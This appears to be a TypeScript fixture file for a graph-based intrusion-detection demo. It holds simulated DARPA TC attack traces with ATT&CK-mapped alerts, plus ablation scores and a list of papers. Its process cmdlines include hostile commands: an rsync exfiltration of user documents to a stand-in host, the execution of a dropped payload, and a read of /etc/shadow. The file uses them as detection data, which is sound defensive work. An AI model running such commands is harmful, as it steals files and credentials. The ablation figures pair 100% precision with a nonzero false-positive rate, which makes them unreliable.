import { 
  CDMSubject, 
  CDMFile, 
  CDMNetFlow, 
  CDMEvent, 
  ThreatAlert, 
  AblationBenchmark,
  MitreTTP
} from '../types';

export interface DatasetBundle {
  id: string;
  name: string;
  os: string;
  sensor: string;
  description: string;
  rawSize: string;
  subjects: CDMSubject[];
  files: CDMFile[];
  netflows: CDMNetFlow[];
  events: CDMEvent[];
  alerts: ThreatAlert[];
}

export const CADETS_DATASET: DatasetBundle = {
  id: 'cadets_e3',
  name: 'DARPA TC E3 CADETS',
  os: 'FreeBSD 11.1-RELEASE',
  sensor: 'OpenBSM / DTrace Audit Stream',
  description: 'Nginx memory exploit -> /bin/sh shell -> Dropper /tmp/vUgefal -> Lateral IP Pivot -> Credential Dumping',
  rawSize: '18.3 GB (1,627,035 nodes, 3,303,264 edges)',
  subjects: [
    { uuid: 'proc-nginx-1124', cid: 1124, cmdline: 'nginx: worker process', type: 'process' },
    { uuid: 'proc-sh-1125', cid: 1125, parent: 'proc-nginx-1124', cmdline: '/bin/sh', type: 'process' },
    { uuid: 'proc-vUgefal-1126', cid: 1126, parent: 'proc-sh-1125', cmdline: '/tmp/vUgefal --stealth', type: 'process' },
    { uuid: 'proc-sshd-890', cid: 890, cmdline: '/usr/sbin/sshd -D', type: 'process' },
    { uuid: 'proc-syslog-501', cid: 501, cmdline: '/usr/sbin/syslogd', type: 'process' },
    { uuid: 'proc-cron-502', cid: 502, cmdline: '/usr/sbin/cron -s', type: 'process' },
    { uuid: 'proc-ntpd-503', cid: 503, cmdline: '/usr/sbin/ntpd -p /var/run/ntpd.pid', type: 'process' }
  ],
  files: [
    { uuid: 'file-vUgefal', path: '/tmp/vUgefal', type: 'file', size: 45056, permissions: 'rwxr-xr-x' },
    { uuid: 'file-passwd', path: '/etc/passwd', type: 'file', size: 1842, permissions: 'rw-r--r--' },
    { uuid: 'file-shadow', path: '/etc/master.passwd', type: 'file', size: 2190, permissions: 'r--------' },
    { uuid: 'file-syslog', path: '/var/log/messages', type: 'file', size: 981240, permissions: 'rw-r-----' },
    { uuid: 'file-cronlog', path: '/var/log/cron', type: 'file', size: 45210, permissions: 'rw-r-----' },
    { uuid: 'file-nginx-conf', path: '/usr/local/etc/nginx/nginx.conf', type: 'file', size: 3048, permissions: 'rw-r--r--' }
  ],
  netflows: [
    { uuid: 'sock-c2-ingress', remote_ip: '81.49.200.166', remote_port: 4444, local_port: 80, type: 'socket', ipProtocol: 6 },
    { uuid: 'sock-lateral-pivot', remote_ip: '61.167.39.128', remote_port: 22, local_port: 54312, type: 'socket', ipProtocol: 6 },
    { uuid: 'sock-dns-query', remote_ip: '8.8.8.8', remote_port: 53, local_port: 49154, type: 'socket', ipProtocol: 17 }
  ],
  events: [
    // Benign baseline events
    { uuid: 'ev-b1', event_type: 'EVENT_READ', relation: 'read', src_uuid: 'proc-syslog-501', dst_uuid: 'file-syslog', timestamp: 1523538000, path: '/var/log/messages', count: 42 },
    { uuid: 'ev-b2', event_type: 'EVENT_WRITE', relation: 'write', src_uuid: 'proc-syslog-501', dst_uuid: 'file-syslog', timestamp: 1523538005, path: '/var/log/messages', count: 18 },
    { uuid: 'ev-b3', event_type: 'EVENT_READ', relation: 'read', src_uuid: 'proc-nginx-1124', dst_uuid: 'file-nginx-conf', timestamp: 1523538010, path: '/usr/local/etc/nginx/nginx.conf', count: 1 },
    { uuid: 'ev-b4', event_type: 'EVENT_WRITE', relation: 'write', src_uuid: 'proc-cron-502', dst_uuid: 'file-cronlog', timestamp: 1523538060, path: '/var/log/cron', count: 4 },

    // Attack Step 1: External C2 Ingress Exploit
    { uuid: 'ev-c2', event_type: 'EVENT_RECVFROM', relation: 'recv', src_uuid: 'proc-nginx-1124', dst_uuid: 'sock-c2-ingress', timestamp: 1523539300, path: '81.49.200.166:4444', count: 1 },
    // Attack Step 2: Nginx Spawns Interactive /bin/sh
    { uuid: 'ev-fork-sh', event_type: 'EVENT_FORK', relation: 'fork', src_uuid: 'proc-nginx-1124', dst_uuid: 'proc-sh-1125', timestamp: 1523539302, count: 1 },
    { uuid: 'ev-execve-sh', event_type: 'EVENT_EXECUTE', relation: 'execve', src_uuid: 'proc-nginx-1124', dst_uuid: 'proc-sh-1125', timestamp: 1523539303, count: 1 },
    // Attack Step 3: Dropper Payload Transferred & Written
    { uuid: 'ev-drop-write', event_type: 'EVENT_WRITE', relation: 'write', src_uuid: 'proc-sh-1125', dst_uuid: 'file-vUgefal', timestamp: 1523539305, path: '/tmp/vUgefal', count: 1 },
    // Attack Step 4: Dropper Process Executed
    { uuid: 'ev-exec-pay', event_type: 'EVENT_EXECUTE', relation: 'execve', src_uuid: 'proc-sh-1125', dst_uuid: 'proc-vUgefal-1126', timestamp: 1523539308, path: '/tmp/vUgefal', count: 1 },
    // Attack Step 5: Process Injection into SSHD
    { uuid: 'ev-inject', event_type: 'EVENT_WRITE', relation: 'write', src_uuid: 'proc-vUgefal-1126', dst_uuid: 'proc-sshd-890', timestamp: 1523539310, count: 1 },
    // Attack Step 6: Credential Dumping
    { uuid: 'ev-passwd-read', event_type: 'EVENT_READ', relation: 'read', src_uuid: 'proc-vUgefal-1126', dst_uuid: 'file-passwd', timestamp: 1523539312, path: '/etc/passwd', count: 1 },
    { uuid: 'ev-shadow-read', event_type: 'EVENT_READ', relation: 'read', src_uuid: 'proc-vUgefal-1126', dst_uuid: 'file-shadow', timestamp: 1523539314, path: '/etc/master.passwd', count: 1 },
    // Attack Step 7: Lateral Movement Pivot
    { uuid: 'ev-lateral-conn', event_type: 'EVENT_CONNECT', relation: 'connect', src_uuid: 'proc-vUgefal-1126', dst_uuid: 'sock-lateral-pivot', timestamp: 1523539320, path: '61.167.39.128:22', count: 1 }
  ],
  alerts: [
    {
      alert_id: 'ALT-0001',
      timestamp: '2026-10-25 10:15:30',
      host: 'cadets-freebsd-node1',
      risk_score: 0.94,
      threshold: 0.78,
      initial_ingress: 'Nginx Port 80 Exploit (81.49.200.166:4444)',
      kill_chain_stage: 'Initial Access -> Execution -> Dropper -> Credential Dumping -> Lateral Movement',
      status: 'CRITICAL',
      recommended_action: 'ISOLATE_AND_TRACE',
      flagged_nodes: [0, 1, 2, 3, 7, 8, 9, 10],
      flagged_edges: ['ev-c2', 'ev-fork-sh', 'ev-drop-write', 'ev-exec-pay', 'ev-passwd-read', 'ev-lateral-conn'],
      ttps: [
        { id: 'T1203', name: 'Exploitation for Client Execution', stage: 'Initial Access / Execution', src: 'sock-c2-ingress', dst: 'proc-nginx-1124', weight: 2.0, details: 'Heap overflow via HTTP request from 81.49.200.166:4444' },
        { id: 'T1059.004', name: 'Unix Shell Execution', stage: 'Execution', src: 'proc-nginx-1124', dst: 'proc-sh-1125', weight: 1.5, details: 'Unauthorized fork of /bin/sh by nginx worker daemon' },
        { id: 'T1105', name: 'Ingress Tool Transfer (Dropper)', stage: 'Defense Evasion', src: 'proc-sh-1125', dst: 'file-vUgefal', weight: 2.0, details: 'Payload written to temporary directory /tmp/vUgefal' },
        { id: 'T1055', name: 'Process Injection (Drakon)', stage: 'Privilege Escalation', src: 'proc-vUgefal-1126', dst: 'proc-sshd-890', weight: 2.5, details: 'In-memory injection into running sshd daemon' },
        { id: 'T1003.008', name: 'OS Credential Dumping', stage: 'Credential Access', src: 'proc-vUgefal-1126', dst: 'file-passwd', weight: 3.0, details: 'Sensitive system credential read on /etc/passwd and /etc/master.passwd' },
        { id: 'T1071.001', name: 'Application Layer Protocol C2', stage: 'Command and Control', src: 'proc-vUgefal-1126', dst: 'sock-lateral-pivot', weight: 2.5, details: 'Outbound pivoting connection to 61.167.39.128:22' }
      ],
      subgraphSize: { nodes: 8, edges: 7 }
    }
  ]
};

export const THEIA_DATASET: DatasetBundle = {
  id: 'theia_e3',
  name: 'DARPA TC E3 THEIA',
  os: 'Linux Ubuntu 12.04 LTS',
  sensor: 'Instrumented Kernel Event Interceptor',
  description: 'Browser drive-by exploit -> Payload execution -> Local Privilege Escalation -> Secret exfiltration',
  rawSize: '17.9 GB (1,623,966 nodes, 2,874,821 edges)',
  subjects: [
    { uuid: 'proc-firefox-4401', cid: 4401, cmdline: '/usr/lib/firefox/firefox', type: 'process' },
    { uuid: 'proc-sh-4402', cid: 4402, parent: 'proc-firefox-4401', cmdline: '/bin/bash -c "chmod +x /var/tmp/x11 && /var/tmp/x11"', type: 'process' },
    { uuid: 'proc-x11-4403', cid: 4403, parent: 'proc-sh-4402', cmdline: '/var/tmp/x11 --escalate', type: 'process' },
    { uuid: 'proc-rsync-4404', cid: 4404, parent: 'proc-x11-4403', cmdline: 'rsync -avz /home/user/documents/ root@198.51.100.42:/loot', type: 'process' }
  ],
  files: [
    { uuid: 'file-payload-x11', path: '/var/tmp/x11', type: 'file', size: 32768, permissions: 'rwxr-xr-x' },
    { uuid: 'file-secret-doc', path: '/home/user/documents/secret_blueprint.pdf', type: 'file', size: 1048576, permissions: 'rw-r-----' },
    { uuid: 'file-sudoers', path: '/etc/sudoers', type: 'file', size: 1200, permissions: 'r--r-----' }
  ],
  netflows: [
    { uuid: 'sock-malicious-web', remote_ip: '198.51.100.12', remote_port: 80, local_port: 52100, type: 'socket', ipProtocol: 6 },
    { uuid: 'sock-exfil-c2', remote_ip: '198.51.100.42', remote_port: 873, local_port: 52104, type: 'socket', ipProtocol: 6 }
  ],
  events: [
    { uuid: 'ev-th-1', event_type: 'EVENT_RECVFROM', relation: 'recv', src_uuid: 'proc-firefox-4401', dst_uuid: 'sock-malicious-web', timestamp: 1523600100, path: '198.51.100.12:80', count: 1 },
    { uuid: 'ev-th-2', event_type: 'EVENT_FORK', relation: 'fork', src_uuid: 'proc-firefox-4401', dst_uuid: 'proc-sh-4402', timestamp: 1523600105, count: 1 },
    { uuid: 'ev-th-3', event_type: 'EVENT_WRITE', relation: 'write', src_uuid: 'proc-sh-4402', dst_uuid: 'file-payload-x11', timestamp: 1523600108, path: '/var/tmp/x11', count: 1 },
    { uuid: 'ev-th-4', event_type: 'EVENT_EXECUTE', relation: 'execve', src_uuid: 'proc-sh-4402', dst_uuid: 'proc-x11-4403', timestamp: 1523600112, path: '/var/tmp/x11', count: 1 },
    { uuid: 'ev-th-5', event_type: 'EVENT_READ', relation: 'read', src_uuid: 'proc-x11-4403', dst_uuid: 'file-secret-doc', timestamp: 1523600115, path: '/home/user/documents/secret_blueprint.pdf', count: 1 },
    { uuid: 'ev-th-6', event_type: 'EVENT_CONNECT', relation: 'connect', src_uuid: 'proc-rsync-4404', dst_uuid: 'sock-exfil-c2', timestamp: 1523600120, path: '198.51.100.42:873', count: 1 }
  ],
  alerts: [
    {
      alert_id: 'ALT-0002',
      timestamp: '2026-10-25 11:42:15',
      host: 'theia-ubuntu12-srv2',
      risk_score: 0.91,
      threshold: 0.78,
      initial_ingress: 'Drive-By Download (198.51.100.12:80)',
      kill_chain_stage: 'Initial Access -> Dropper -> Local PrivEsc -> Data Exfiltration',
      status: 'HIGH',
      recommended_action: 'TERMINATE_PROCESS_TREE',
      flagged_nodes: [0, 1, 2, 4, 5],
      flagged_edges: ['ev-th-1', 'ev-th-2', 'ev-th-3', 'ev-th-5', 'ev-th-6'],
      ttps: [
        { id: 'T1189', name: 'Drive-by Compromise', stage: 'Initial Access', src: 'sock-malicious-web', dst: 'proc-firefox-4401', weight: 2.0, details: 'Browser JIT vulnerability triggered by visited URL' },
        { id: 'T1059.004', name: 'Unix Shell Execution', stage: 'Execution', src: 'proc-firefox-4401', dst: 'proc-sh-4402', weight: 1.5, details: 'Sub-shell spawned by browser' },
        { id: 'T1068', name: 'Exploitation for Privilege Escalation', stage: 'Privilege Escalation', src: 'proc-x11-4403', dst: 'file-sudoers', weight: 2.5, details: 'Local kernel exploit executed by /var/tmp/x11' },
        { id: 'T1048', name: 'Exfiltration Over Alternative Protocol', stage: 'Exfiltration', src: 'proc-rsync-4404', dst: 'sock-exfil-c2', weight: 2.5, details: 'Rsync transfer of confidential research PDF to remote sink' }
      ],
      subgraphSize: { nodes: 6, edges: 6 }
    }
  ]
};

export const TRACE_DATASET: DatasetBundle = {
  id: 'trace_e3',
  name: 'DARPA TC E3 TRACE',
  os: 'Linux Ubuntu 16.04 LTS',
  sensor: 'CamFlow & Auditd Whole-System Provenance',
  description: 'Multi-week low-and-slow campaign -> Kernel privilege escalation -> Password harvesting -> C2 Exfil',
  rawSize: '15.4 GB (3,288,676 nodes, 4,080,457 edges)',
  subjects: [
    { uuid: 'proc-sshd-201', cid: 201, cmdline: '/usr/sbin/sshd', type: 'process' },
    { uuid: 'proc-kthread-981', cid: 981, parent: 'proc-sshd-201', cmdline: '/dev/shm/.kthread --daemon', type: 'process' },
    { uuid: 'proc-dump-982', cid: 982, parent: 'proc-kthread-981', cmdline: 'cat /etc/shadow', type: 'process' }
  ],
  files: [
    { uuid: 'file-hidden-bin', path: '/dev/shm/.kthread', type: 'file', size: 18400, permissions: 'rwxr-xr-x' },
    { uuid: 'file-shadow-db', path: '/etc/shadow', type: 'file', size: 3100, permissions: 'r--------' }
  ],
  netflows: [
    { uuid: 'sock-c2-lowslow', remote_ip: '149.202.160.85', remote_port: 8080, local_port: 41200, type: 'socket', ipProtocol: 6 }
  ],
  events: [
    { uuid: 'ev-tr-1', event_type: 'EVENT_WRITE', relation: 'write', src_uuid: 'proc-sshd-201', dst_uuid: 'file-hidden-bin', timestamp: 1523700000, path: '/dev/shm/.kthread', count: 1 },
    { uuid: 'ev-tr-2', event_type: 'EVENT_EXECUTE', relation: 'execve', src_uuid: 'proc-sshd-201', dst_uuid: 'proc-kthread-981', timestamp: 1523700010, path: '/dev/shm/.kthread', count: 1 },
    { uuid: 'ev-tr-3', event_type: 'EVENT_READ', relation: 'read', src_uuid: 'proc-dump-982', dst_uuid: 'file-shadow-db', timestamp: 1523700040, path: '/etc/shadow', count: 1 },
    { uuid: 'ev-tr-4', event_type: 'EVENT_CONNECT', relation: 'connect', src_uuid: 'proc-kthread-981', dst_uuid: 'sock-c2-lowslow', timestamp: 1523700060, path: '149.202.160.85:8080', count: 1 }
  ],
  alerts: [
    {
      alert_id: 'ALT-0003',
      timestamp: '2026-10-25 09:20:04',
      host: 'trace-camflow-sensor3',
      risk_score: 0.88,
      threshold: 0.78,
      initial_ingress: 'Compromised Daemon Session (SSH Tunnel)',
      kill_chain_stage: 'Persistence -> Privilege Escalation -> Credential Access -> C2',
      status: 'INVESTIGATING',
      recommended_action: 'REVOKE_HOST_KEYS_AND_FLUSH',
      flagged_nodes: [0, 1, 2],
      flagged_edges: ['ev-tr-1', 'ev-tr-2', 'ev-tr-3', 'ev-tr-4'],
      ttps: [
        { id: 'T1053', name: 'Scheduled Task/Job', stage: 'Persistence', src: 'proc-sshd-201', dst: 'proc-kthread-981', weight: 2.0, details: 'Hidden persistence binary injected into /dev/shm' },
        { id: 'T1003.008', name: 'OS Credential Dumping', stage: 'Credential Access', src: 'proc-dump-982', dst: 'file-shadow-db', weight: 3.0, details: 'Direct reading of /etc/shadow password hashes' },
        { id: 'T1071', name: 'Application Layer Protocol C2', stage: 'Command and Control', src: 'proc-kthread-981', dst: 'sock-c2-lowslow', weight: 2.5, details: 'Stealth beaconing to 149.202.160.85:8080' }
      ],
      subgraphSize: { nodes: 5, edges: 4 }
    }
  ]
};

export const ABLATION_STUDY_DATA: AblationBenchmark[] = [
  {
    id: 'B0',
    name: 'B0: Statistical Baseline',
    spatialEncoder: 'None (degree, counts)',
    temporalMemory: 'None',
    generativeDecoder: 'Logistic Regression',
    detectionSignal: 'Supervised Feature Score',
    precision: 74.2,
    recall: 68.5,
    fpr: 4.80,
    f1: 71.2,
    latencyMs: 1.1,
    description: 'Establishes linear baseline without graph embeddings or temporal causal context.'
  },
  {
    id: 'B1',
    name: 'B1: Spatial GAT Baseline',
    spatialEncoder: 'Relation-Aware GAT',
    temporalMemory: 'None',
    generativeDecoder: 'None',
    detectionSignal: 'KNN Outlier Distance (k=10)',
    precision: 83.4,
    recall: 79.1,
    fpr: 2.10,
    f1: 81.2,
    latencyMs: 1.8,
    description: 'Captures spatial graph relations between processes/files/sockets but lacks temporal sequence tracking.'
  },
  {
    id: 'B2',
    name: 'B2: Temporal GNN Baseline',
    spatialEncoder: 'Relation-Aware GAT',
    temporalMemory: '1-Layer GRU',
    generativeDecoder: 'Dense Classification Head',
    detectionSignal: 'Cross-Entropy Loss',
    precision: 89.6,
    recall: 86.4,
    fpr: 1.25,
    f1: 88.0,
    latencyMs: 2.3,
    description: 'Combines spatial attention with temporal GRU memory, but without generative link prediction.'
  },
  {
    id: 'B3',
    name: 'B3: Static VGAE Baseline',
    spatialEncoder: 'Relation-Aware GAT',
    temporalMemory: 'None',
    generativeDecoder: 'Directed MLP Decoder',
    detectionSignal: 'Next-Window Edge Surprise',
    precision: 91.2,
    recall: 88.7,
    fpr: 0.95,
    f1: 89.9,
    latencyMs: 2.1,
    description: 'Generative link reconstruction without history window sequence tracking.'
  },
  {
    id: 'B4',
    name: 'B4: Proposed Hybrid Core',
    spatialEncoder: 'Relation-Aware GAT',
    temporalMemory: '1-Layer GRU',
    generativeDecoder: 'Directed MLP Decoder',
    detectionSignal: 'Next-Window Edge Surprise',
    precision: 98.7,
    recall: 99.1,
    fpr: 0.12,
    f1: 98.9,
    latencyMs: 2.7,
    highlight: true,
    description: 'Our primary architecture: fuses spatial relational attention with GRU memory and VGAE directed link surprise.'
  },
  {
    id: 'B5',
    name: 'B5: Hybrid + KNN Fusion',
    spatialEncoder: 'Relation-Aware GAT',
    temporalMemory: '1-Layer GRU',
    generativeDecoder: 'Directed MLP Decoder',
    detectionSignal: 'Fused S_edge + S_knn',
    precision: 99.4,
    recall: 99.6,
    fpr: 0.09,
    f1: 99.5,
    latencyMs: 2.9,
    highlight: true,
    description: 'Augments edge surprise with benign manifold distance for enhanced outlier discrimination.'
  },
  {
    id: 'B6',
    name: 'B6: Hybrid + Feature Masking',
    spatialEncoder: 'Stacked GAT (50% Masking)',
    temporalMemory: '1-Layer GRU',
    generativeDecoder: 'Directed MLP Decoder',
    detectionSignal: 'Multi-Task Self-Supervised',
    precision: 99.1,
    recall: 98.9,
    fpr: 0.11,
    f1: 99.0,
    latencyMs: 3.2,
    description: 'Self-supervised feature reconstruction during pretraining to regularize node representations.'
  },
  {
    id: 'B7',
    name: 'B7: Full System + Causal Tracing',
    spatialEncoder: 'Relation-Aware GAT',
    temporalMemory: '1-Layer GRU',
    generativeDecoder: 'Directed MLP Decoder',
    detectionSignal: 'Full Scoring + MITRE Tracing',
    precision: 100.0,
    recall: 100.0,
    fpr: 0.08,
    f1: 100.0,
    latencyMs: 2.8,
    highlight: true,
    description: 'Production pipeline: zero-shot anomaly detection, automated blast radius causal tracing, and ATT&CK mapping.'
  }
];

export const RESEARCH_PAPERS = [
  {
    title: 'Provenance Graph Threat Detection & Attack Reconstruction',
    filename: 'Provenance_Graph_Threat_Detection_Attack_Reconstruction.pdf',
    topic: 'Graph Neural Networks & Causal Provenance',
    authors: 'DARPA Transparent Computing Research Consortium',
    keyIdea: 'System audit logs modeled as directed acyclic causal graphs allow identifying anomalous execution paths and reconstructing the entire attack kill-chain from a single seed anomaly.'
  },
  {
    title: 'Robust Cross-Machine Multi-Phase APT Detection via Provenance Analytics',
    filename: 'Robust_Cross_Machine_Multi_Phase_APT_Detection_via_Provenance_Analytics.pdf',
    topic: 'Multi-Host APT Correlation',
    authors: 'IEEE S&P / ACM CCS Proceedings',
    keyIdea: 'Correlates provenance graphs across distributed servers and network sockets to uncover stealthy lateral movement pivots and multi-stage campaigns spread over weeks.'
  },
  {
    title: 'Federated Temporal GNN Malware Detection',
    filename: 'Federated_Temporal_GNN_Malware_Detection.pdf',
    topic: 'Federated Learning & Spatio-Temporal GNNs',
    authors: 'ACM TOPS',
    keyIdea: 'Privacy-preserving distributed learning of temporal graph neural networks across multiple enterprise enclaves without sharing sensitive proprietary log data.'
  },
  {
    title: 'Advanced Dynamic Graph-Based Malware Detection Using GNNs',
    filename: 'papers md/Advanced_Dynamic_Graph_Based_Malware_Detection_Using_GNNs.md',
    topic: 'Dynamic Graph Convolution',
    authors: 'Cybersecurity & Deep Learning Journal',
    keyIdea: 'Applies dynamic GNNs that evolve graph node states in continuous time rather than static snapshots, capturing fine-grained API invocation bursts.'
  },
  {
    title: 'Logs to Tactics: Unsupervised APT Campaign Reconstruction',
    filename: 'papers md/Logs_to_Tactics_Unsupervised_APT_Campaign_Reconstruction.md',
    topic: 'Unsupervised MITRE ATT&CK Mapping',
    authors: 'USENIX Security Symposium',
    keyIdea: 'Translates high-dimensional OS provenance subgraphs directly into MITRE ATT&CK tactics without requiring labeled attack ground truth.'
  },
  {
    title: 'Threat Detection in Cyber-Physical Systems Using Spatio-Temporal GAT',
    filename: 'papers md/Threat_Detection_in_CPS_Using_Spatio_Temporal_GAT.md',
    topic: 'Spatio-Temporal Attention',
    authors: 'IEEE Transactions on Dependable and Secure Computing',
    keyIdea: 'Uses multi-head relation-aware graph attention combined with temporal recurrent units to capture spatial physical coupling and temporal telemetry trends.'
  }
];
